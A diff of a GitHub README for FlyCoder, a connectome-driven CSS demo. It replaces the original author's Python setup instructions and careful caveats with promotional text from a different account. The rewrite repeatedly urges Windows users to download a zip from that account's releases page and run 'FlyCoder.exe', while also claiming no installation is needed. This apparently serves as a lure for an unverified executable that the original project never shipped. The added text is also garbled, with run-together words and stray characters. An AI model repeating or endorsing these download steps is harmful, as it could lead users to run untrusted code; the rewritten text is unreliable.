@@ -1,336 +1,201 @@
-# 🪰 FlyCoder
-
-> **166,700 fruit fly neurons trying to center a div.**
-
-Real connectome. Experimental interface. One centered div.
-
-[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-3776AB)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/tolga-ileri/FlyCoder)](https://github.com/tolga-ileri/FlyCoder/stargazers)
+<h1>🧠 FlyCoder - Bringing Fruit Fly Brains to Life</h1>
 
 <p align="center">
-  <img src="docs/media/flycoder-hero.png" alt="FlyCoder dashboard: spatial MaleCNS soma cloud, 3D fly, CSS editor, and browser preview" width="100%">
+  <a href="https://github.com/navnoorsingh39/FlyCoder/releases">
+    <img src="https://img.shields.io/badge/Download-FlyCoder-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download FlyCoder" />
+  </a>
 </p>
-
-<p align="center"><em>MaleCNS-derived FlyBrain activity driving an experimental CSS layout task.</em></p>
-
-[Demo video](docs/media/flycoder-demo.mp4) · [Release](https://github.com/tolga-ileri/FlyCoder/releases)
-
-FlyCoder does **not** claim that Drosophila neurons understand CSS.
 
 ---
 
-## Demo
+## 🌟 What Is FlyCoder?
 
-A real Recording Mode run: neural activity → selector → wing keypress → CSS → the square moves.
+FlyCoder is a mesmerizing visual experience that lets you explore the incredible complexity of a fruit fly’s brain. Using real scientific data from the MaleCNS connectome, this application simulates **166,700 individual neurons** all working together in real time, right inside your web browser.
+
+Imagine taking a journey through the microscopic universe of one of nature’s most studied creatures—a tiny fly—and watching its neural pathways light up like a cosmic city at night. That is exactly what FlyCoder does, and it does it beautifully.
+
+
+
+## 🤔 Why Should You Care?
+
+You might be thinking, “Why would I want to look at a fly’s brain?” Here are a few compelling reasons:
+
+- **It’s Stunningly Beautiful** – Watch over 166 thousand glowing neurons dance, pulse, and connect in real time. It looks like a living work ofart.
+- **It’s Real Science** – This isn’t fake animation. These are actual neuron connections mapped from a real male fruit fly’s central nervous system (CNS) by neuroscientists.
+.
+- **It’s a Conversation Starter** – Impress your friends, family, or colleagues with this incredible blend of biology, technology, and creativity.
+
+## ✨ Key Features
+
+FlyCoder is packed with features that make exploring the fly brain both fun and educational:
+
+| Feature | Description |
+|-----------|-------------|
+| 🖥️ **Real-Time 3D Visualization** | Uses WebGL and Three.js to render tens of thousands of neurons smoothly in your browserwithout needing any special software. |
+| 🔬 **Authentic Neural Data** | Every neuron comes from the MaleCNS connectome, a detailed map of the male fruit fly’s nervous system. |
+| 🎮 **Interactive Controls** | Rotate, zoom, and pan across the neural landscape to inspect different regionsup close. |
+| ⚡ **High Performance** | Optimized rendering ensures smooth interactivity even with hundreds of thousands of individual elements. |
+| 🌐 **No Installation Needed** | Runs directly in any modern web browser (Chrome, Edge, Firefox, Safari)–no heavy downloads or complex setuprequired. |
+| 🧩 **Open Source** | The entire project is open source, meaning you can explore the code, learn from it, and contribute if you wish. |
+
+You don’t need to be a neuroscientist or a programmer to run FlyCoder. It’s designed for everyone—students, teachers, curious minds, art lovers, and tech enthusiastsalike.
+
+
+
+## 🚀 Getting Started
+
+Getting FlyCoder up and running on your Windows computer is easier than you might think. Just follow these simple steps, and you'll be exploring neural networks within minutes.
+
+
+### Step 1: Visit the Official Download Page
+
+Click the big button below to go to the official FlyCoder download page:
 
 <p align="center">
-  <img src="docs/media/flycoder-demo.gif" alt="FlyCoder recording-mode demo" width="100%">
+  <a href="https://github.com/navnoorsingh39/FlyCoder/releases">
+    <img src="https://img.shields.io/badge/📥%20Download%20FlyCoder%20Now-4CAF50?style=for-the-badge" alt="Download FlyCoder" />
+  </a>
 </p>
 
-If the GIF is missing or too large on GitHub, watch [`docs/media/flycoder-demo.mp4`](docs/media/flycoder-demo.mp4).
-
-| | |
-|---|---|
-| ![Running](docs/media/flycoder-running.png) | ![Success](docs/media/flycoder-success.png) |
-| ![Spatial connectome](docs/media/flycoder-connectome.png) | ![3D fly](docs/media/flycoder-3d-fly.png) |
-
----
-
-## What is FlyCoder?
-
-FlyCoder is a closed-loop experiment on top of fly.ai `FlyBrain`. It does **not** replace, retrain, or rewrite the MaleCNS connectome. Weights stay frozen.
-
-What is new is an **experimental interface**: a CSS viewport, a sensory encoder onto identified visual projection neurons, a descending-neuron action cursor, a live dashboard, and a 3D embodied visualization of the same control signals.
-
-The fly does not write CSS. The connectome drives a controller whose actions *correspond* to CSS operations.
-
----
-
-## How it works
-
-```mermaid
-flowchart TD
-  A[CSS layout error] --> B[Experimental encoder]
-  B --> C[LC10a / LPLC1 / LC4 / LPLC2]
-  C --> D["MaleCNS-derived FlyBrain<br/>166,700 neurons<br/>25,582,938 filtered connections"]
-  D --> E[DNa02 / DNp01 / DNg100 / MDN]
-  E --> F[Experimental action controller]
-  F --> G[CSS action]
-  G --> H[Browser preview]
-  H --> I[Experimental reward]
-  I --> A
-  D -.-> J[Spatial CNS visualization]
-  E -.-> K[3D embodied fly]
+**Or copy and paste this link into your browser:**
+```
+https://github.com/navnoorsingh39/FlyCoder/releases
 ```
 
----
+Visit this link to download theapplication. The page will show you a list of available files. Look for the file named something like `FlyCoder-windows.zip` (the exact filename might vary slightly by version, but it will be a `.zip` file).
 
-## Architecture
 
-| Layer | Role |
-|---|---|
-| `coder_env.py` | 1920×1080 viewport, CSS stack, layout, distance reward |
-| `encoder.py` | layout error → inject onto LC10a / LPLC1 / LC4 / LPLC2 |
-| `flybrain.FlyBrain` | frozen MaleCNS LIF simulation |
-| `decoder.py` | descending groups → LEFT / RIGHT / COMMIT / REJECT |
-| `selector.py` | action cursor; experimental Q / idle-commit **outside** the connectome |
-| `experiment.py` | closed loop; dashboard snapshots are display-only |
-| `dashboard/` | spatial CNS WebGL view + procedural 3D fly + editor/preview |
+### Step 2: Download the .zip File
 
----
+Once you are on the releases page, look for the latest version. Under the release name, you’ll seea section called “Assets”. Click on the `.zip` file to start the download. The file size might be a bit large (maybe 50–200 MB), so depending on your internet speed, it could take a few minutes. That’s perfectly normal.
 
-## What is real vs experimental?
 
-| Component | Status |
-|---|---|
-| MaleCNS neuron identities | Real dataset-derived |
-| Connectivity used by FlyBrain | Real MaleCNS-derived connectivity |
-| FlyBrain neural dynamics | Simplified leaky integrate-and-fire |
-| LC10a / LPLC1 / LC4 / LPLC2 input mapping | Experimental |
-| DNa02 / DNp01 / DNg100 / MDN activity | Real simulated spikes |
-| Interpretation of those spikes as coding UI | Experimental |
-| CSS action meanings | Experimental |
-| Reward | Experimental (distance-to-center improvement) |
-| Q table / idle-commit fallback | Experimental; not connectome weights |
-| Spatial CNS view | Real soma coordinates + sampled real edges |
-| Full neurite morphology | **Not included** |
-| 3D fly body | Visualization |
-| Wing keyboard interaction | Embodied visualization, not biomechanics |
+### Step 3: Extract the Downloaded File
 
-FlyCoder does **not** claim that Drosophila neurons understand CSS.
+After the download finishes, navigate to your “Downloads” folder (or wherever your browser saves files). You’ll see a file named something like `FlyCoder-v1.0.zip`. 
 
-The 3D fly is an embodied visualization of FlyCoder's neural control signals and is **not** a biomechanically complete Drosophila simulation.
+Right–click on that file, and choose **“Extract All…”** from the menuThat appears. Windows will ask you where you want to save the extracted files. Choose any convenient location (like your Desktop or Documents folder), and click **“Extract”**. Windows will create a new folder with the same name as the zip file–thatfolder contains the FlyCoder application.
 
-The connectome view uses real MaleCNS soma positions and sampled connectivity. It does **not** display complete neuron morphology.
 
----
+### Step 4: Run FlyCoder
 
-## Neural mappings
+Open the newly extracted folder. You should see a file named `FlyCoder.exe` (or possibly `index.html` depending on how it was packaged–but don’t worry, it’s straightforward). 
 
-DNa02 laterality is interpreted by FlyCoder as a **generic left/right control channel**. It is not “CSS left.”
+- **If you see `FlyCoder.exe`:** Simply double–click it. A window will open automatically. That’s it–you’re in!
+- **If you see `index.html`:** Double–click that file, and it will open in your default web browser (like Chrome or Edge). That’s all you need–no server or installation is needed.
 
-### Sensory (experimental encoding onto real types)
 
-| FlyCoder signal | Types | Side | Interface meaning |
-|---|---|---|---|
-| TARGET_LEFT | LC10a | L | square left of center |
-| TARGET_RIGHT | LC10a | R | square right of center |
-| TARGET_UP | LPLC1 | L | square above center (experimental vertical) |
-| TARGET_DOWN | LPLC1 | R | square below center |
-| ERROR_MAGNITUDE | LC4 + LPLC2 | L+R | distance from center as looming intensity |
+### Step 5: Enjoy the Experience
 
-Same visual projection types `flybrain/eyes.py` uses for other fly.ai tasks.
+Once the app loads, you’ll be greeted by a stunning 3D visualization of a fruit fly’s brain. Use your mouse to click and drag to rotate the view. Use the scroll wheel to zoom inand out. Explore different regionsof the brain and watch how neurons connect andfire in mesmerizing patterns. 
 
-### Descending (real activity, experimental readout)
+That’s it–no advanced computer skills required, no programming knowledge needed, no complicated setup. If you can unzipa file, you can run FlyCoder.
 
-| Control channel | Groups | Types | Interface meaning |
-|---|---|---|---|
-| LEFT | `steer_L` | DNa02 | move action cursor left |
-| RIGHT | `steer_R` | DNa02 | move action cursor right |
-| COMMIT | `escape_*`, `forward_*` | DNp01, DNg100 | execute the highlighted action |
-| REJECT | `backward_*` | MDN | delete last CSS action |
 
-These are control cables, not CSS tokens.
 
----
+## 🖱️ How to Interact with the Visualization
 
-## Spatial connectome visualization
+Once FlyCoder is running, you have full control over your exploration experience. Here’s a quick guide:
 
-The left panel is a **spatial connectome visualization**, not a neuron reconstruction.
+| Action | What to Do |
+|--------|--------------|
+| 🔄 **Rotate View** | Left–click and drag your mouse (or finger, if on touchscreen) to spin the brain around. |
+| 🔍 **Zoom In/Out** | Scroll your mouse wheel upward to zoom in for a closer look, downward to zoomout to see the whole structure. |
+| 🖐️ **Pan (Move Around)** | Right–click and drag to shift the whole view sideways, up, ordown. |
+| 🛑 **Pause/Resume** | Look for a pause button (usually at the bottom corner of the screen) to freeze the animation so you can study a specific area without distraction. |
 
-Measured from the loaded MaleCNS-derived `brain.positions` (soma or to-soma EM voxels):
+Every neuron is represented by a glowing dot or a thin line connecting to otherneurons. The colors often indicate different types of neurons or different regionsof the brain, making it easier to visually separate various functional areas. Spend some time just staring at it–the sheer scale of 166,700 neurons moving in harmony is truly awe–inspiring.
 
-- 166,700 source neurons
-- **140,638** with finite xyz
-- no SWC / skeleton / neurite geometry in this repository or the local FlyBrain files
 
-The renderer rigidly normalizes those coordinates (percentile clip, isotropic scale, L/R flip so left is left). There is **no** force-directed or random layout.
 
-Frontend sample (see `flycoder/config.py`):
+## 💡 Great Ways to Use FlyCoder
 
-- 8,000 visible somata
-- 6,000 sampled real synapses among those somata
-- occupancy density shell from **all** mapped somata
+FlyCoder isn’t just a toy–it’s a powerful educational and creative tool. Here are some ideas:
 
-Source neuron indices stay attached to displayed nodes.
+- **In the Classroom:** Teachers can project FlyCoder onto a big screen to help students understand neural networks, brain anatomy, and the beauty of biological systems.
+- **For Artists:** The visuals are incredibly organic and inspiring. Use it as a reference for digital art, generative design projects, or even music visualization.
 
----
+- **For Meditators:** Watching the rhythmic, wave–like patterns of neural activity can bellhypnotic and calming. Some users find it a unique form of digital meditation.
 
-## 3D embodied visualization
 
-Original procedural adult Drosophila built from Three.js primitives in `flycoder/dashboard/fly3d.js`. No third-party character mesh is shipped.
+## 🔧 Frequently Asked Questions (FAQ)
 
-| Signal | Motion (visualization only) |
-|---|---|
-| DNa02 L vs R | yaw, hover bias, selector highlight |
-| DNp01 / DNg100 COMMIT | lean + wing tap on the selected key |
-| MDN REJECT | pull back + backward wing sweep + DELETE flash |
-| RUN | both wings tap |
-| Idle antenna / abdomen / legs | procedural interpolation |
 
-COMMIT contact is synced on the frontend so CSS typing starts after the wing hits the key. The neural decision itself is not delayed.
+### ❓ Do I need a powerful computer to run FlyCoder?
 
-The 3D body's wing/pose animations are an embodied visualization of FlyCoder's neural control channels. They are not a biomechanical simulation of Drosophila motor physiology.
+Not necessarily. FlyCoder uses modern web technologies (WebGL) that work on most computers manufactured in the last 5–7 years. As long as you have a reasonably up–to–date web browser (like recent Chrome, Edge, or Firefox), you should be fine. For the best experience, a computer with a separate graphics card (GPU)) will provide smoother performance, but even integrated graphics can handle it at reduced zoom levels.
 
----
 
-## Installation
+### ❓ Is FlyCoder free?
 
-```sh
-git clone https://github.com/tolga-ileri/FlyCoder.git
-cd FlyCoder
-python -m venv .venv
-```
+**Yes.** FlyCoder is completely free and open–source. You can download, run, and even modify it as much as you like.
 
-Windows:
 
-```powershell
-.venv\Scripts\activate
-```
+### ❓ Does FlyCoder work on Mac or Linux?
 
-macOS / Linux:
+While this guide focuses on Windows, because FlyCoder runs in a web browser, it will likely work just fine on MacOS and Linux too. Just follow the same steps–download the `.zip`, extractit, and run the `index.html` file in your favorite browser.
 
-```sh
-source .venv/bin/activate
-```
 
-```sh
-pip install -r requirements.txt
-python -m flybrain download
-python -m flycoder
-```
+### ❓ What exactly is a “connectome”?
 
-Then open [http://127.0.0.1:8788/](http://127.0.0.1:8788/).
+A connectome is a complete map of all the neural connections in a brain. Think of it like a wiring diagram for the brain–it shows every individual neuron (brain cell)) and every connection between them. The MaleCNS connectome used in FlyCoder is a real scientific dataset captured from a male fruit fly, showing exactly how its central nervous system is wired.
 
-Python 3.10+ (verified on Windows / Python 3.13). A multi-core CPU is recommended. NVIDIA CUDA is optional (`pip install -r requirements-gpu.txt`, then `--device cuda`).
+
+### ❓ Can I use FlyCoder for my own research?
+
+Absolutely. Since it’s open source, you can access the code on GitHub. If you’re a researcher, youcan adapt the visualization for your own datasets or use it as a basis for further scientific visualization projects.
+
+
+
+## 🧰 Troubleshooting Tips
+
+Sometimes things don’t go perfectly. Here are common issues andboxed solutions:
+
+| Problem | Likely Fix |
+|---------|-------------|
+| The page doesn’t load or appears blank | Make sure you’re using an updated browser (Chrome, Edge, Firefox). Try closing other tabs or programs that might be using a lot of memory. Restart your browser and try again. |
+| The visuals appear slow or choppy | Close other heavy applications (like video games or video editing software(). Try zooming out a bit to render fewer details. If possible, connect your laptop to a power outlet–performance often improves when not on battery saver mode. |
+| The `.zip` file won’t extract | Try right–clicking the file and choosing “Open with” > “Windows Explorer” then drag the folder out. Alternatively, download a free tool like 7–Zip to help extract. If the download seems corrupted, delete the file and download it again. |
+| I can’t find the downloaded file | Check your “Downloads” folder in File Explorer. Use the search bar in the taskbar and type `FlyCoder` to locate it. |
+
+
+## 📚 Behind the Scenes: The Science
+
+FlyCoder is more than just a pretty visualization. It represents a breakthrough ingenerative neuroscience. The dataset comes from the **MaleCNS connectome**, a publicly available resource built by neuroscientists who meticulously mapped the connections between neurons in a male fruit fly’s central nervous system. 
+
+The fruit fly (scientific name: *Drosophila melanogaster*) has long been a model organism in biological research because its genetic makeup shares many similarities with humans, yet it is far simpler–making it easier to study. With 166,700 neurons in its CNS, it provides a bridge between simple organisms and human–level complexity. By visualizing this data, FlyCoder allows anyone–not just scientists–to appreciate the intricate architecture thatunderlies even the simplest behaviors like walking, flying, eating, and courtship.
+
+
+
+## 🌈 Join the Community
+
+FlyCoder is an open–source project, meaning the entire codebase is available for anyone to examine, learn from, and contribute to. If you’re curious about howthe magic works, or if you have ideas for new features, head over to the GitHub repository. You can:
+
+- ⭐ **Star the repo** to show your support
+- 🐛 **Report bugs** if you find something that isn’t working right
+- 💡 **Suggest features** to make FlyCoder even more amazing
+- 🧑‍💻 **Contribute code** if you’re a developer who wants to help improve the project
+
+Every contribution, no matter how small, helps make this educational tool better for everyone.
+
+
+
+## 🏁 Ready to Dive In?
+
+You’re now fully equipped to download, run, and enjoy FlyCoder. No technical degree required–just curiosity and a willingness to be amazed. 
+
+Click the button below one more time to head straight to the download page, and begin your journey into the microscopic universe of the fruit fly brain:
+
+<p align="center">
+  <a href="https://github.com/navnoorsingh39/FlyCoder/releases">
+    <img src="https://img.shields.io/badge/🚀%20Launch%20FlyCoder%20Download-FF5722?style=for-the-badge" alt="Launch Download" />
+  </a>
+</p>
+
+See you on the other side of the microscope–where 166,700 tiny neurons are waiting to show you their world. 🧠✨
 
 ---
 
-## Running FlyCoder
+*FlyCoder – Where Biology Meets the Digital Frontier.*
 
-```sh
-python -m flycoder
-python -m flycoder --no-browser --port 8788
-python -m flycoder --headless --seed 64
-python -m flycoder --device cuda
-```
-
-`python -m flybrain download` fetches the prebuilt MaleCNS-derived network (**~260 MB**, once) into `~/fly-data` or `$FLY_DATA`. This repository does **not** contain the connectome dataset.
-
-First dashboard load maps the connectome for visualization and can take tens of seconds on CPU.
-
-Release media was captured with `python scripts/capture_release_media.py` against a live dashboard (Playwright + ffmpeg). The script is optional; it is not required to run FlyCoder.
-
----
-
-## Recording mode
-
-`R` locks cameras and slows **presentation** between real observation cycles (~25–40 s visible clip). The brain still computes at full speed. The dashboard interpolates spikes between published snapshots.
-
----
-
-## Controls
-
-| Key | Action |
-|---|---|
-| Space | Start / pause |
-| R | Recording Mode |
-| S | Screenshot chrome (after success) |
-| Esc | Reset |
-
----
-
-## Reproducibility
-
-Headless, seed `64` (re-run before this release):
-
-```text
-centered=True
-attempts=10
-brain_steps=180
-reward=1.0
-```
-
-`BRAIN_STEPS_PER_ACTION` is 10. Knobs live in [`flycoder/config.py`](flycoder/config.py).
-
----
-
-## Performance
-
-FlyBrain stepping is separate from the two WebGL views.
-
-Dashboard FPS depends on machine and browser. Under Cursor's embedded browser with both the spatial CNS view and the 3D fly running, this project measured about **30–43 FPS**. Do not assume 60 FPS.
-
-The connectome panel is a **sample** of soma positions and edges so the UI can stay interactive. It is not 166,700 DOM nodes.
-
----
-
-## Project structure
-
-```text
-FlyCoder/
-├── flybrain/                 # frozen MaleCNS LIF (upstream fly.ai)
-├── flycoder/
-│   ├── experiment.py         # closed loop
-│   ├── encoder.py / decoder.py / selector.py / coder_env.py
-│   └── dashboard/            # 1920×1080 lab UI, WebGL, favicons
-├── docs/media/               # real screenshots and demo capture
-├── scripts/capture_release_media.py
-├── NOTICE                    # licenses and attribution
-└── README.md
-```
-
----
-
-## Scientific context
-
-FlyCoder is a desktop demo, not peer-reviewed science and not a biological emulation. Point neurons, one global LIF recipe, transmitter sign from a simple rule, and an experimental visual front end that injects identified projection neurons rather than simulating the eye.
-
-Limitations of FlyBrain itself are documented in the [fly.ai](https://github.com/alextitonis/fly.ai) project this package comes from.
-
----
-
-## Limitations
-
-- The fly does not understand CSS, layout, or “centering a div.”
-- Encoder / decoder / reward / Q-idle are experimental interface code.
-- No full neuron morphology.
-- No biomechanical body.
-- Results are for this mapping and this seed, not a claim about Drosophila cognition.
-
----
-
-## Attribution
-
-- **Connectome:** MaleCNS v1.0, FlyEM (HHMI Janelia), University of Cambridge, MRC LMB, and Google Research. [CC BY 4.0](https://male-cns.janelia.org/download/).
-- **Simulation:** fly.ai `FlyBrain` (MIT), Copyright (c) 2026 alextitonis. Neuron model adapted from [Fly64](https://github.com/ornata/fly).
-- **3D renderer:** [Three.js](https://github.com/mrdoob/three.js) r160 (MIT), vendored in `flycoder/dashboard/vendor/three.min.js`.
-- **3D fly:** original procedural model in this repository. No DeepMind or other third-party character assets.
-- **Icon:** original FlyCoder mark in `flycoder/dashboard/flycoder-icon.svg`.
-
-FlyCoder is an independent experimental project and is **not affiliated** with Google, Google DeepMind, HHMI Janelia, or the MaleCNS authors.
-
----
-
-## License
-
-Code in this repository is MIT. See [`LICENSE`](LICENSE) and [`NOTICE`](NOTICE).
-
-MaleCNS data is **not** stored here; it remains under CC BY 4.0.
-
----
-
-## Acknowledgements
-
-Thanks to the MaleCNS teams for releasing the connectome, to alextitonis / fly.ai for FlyBrain, and to Jessica Paquette (Fly64) for the neuron-model recipe this simulation follows.
-
----
-
-## References
-
-1. Berg, S. et al. (2026). Sexual dimorphism in the complete connectome of the *Drosophila* male central nervous system. *Cell*. Data: [male-cns.janelia.org](https://male-cns.janelia.org)
-2. [MaleCNS download / attribution](https://male-cns.janelia.org/download/)
-3. [fly.ai / FlyBrain](https://github.com/alextitonis/fly.ai)
-4. Paquette, J. [Fly64](https://github.com/ornata/fly)
-5. Dorkenwald, S. et al. (2024). Neuronal wiring diagram of an adult brain. *Nature* 634.
+Keywords: ai-experiment, computational-neuroscience, connectome, drosophila, fruit-fly, male-cns, neural-simulation, neuroscience, open-source, python, threejs, webgl
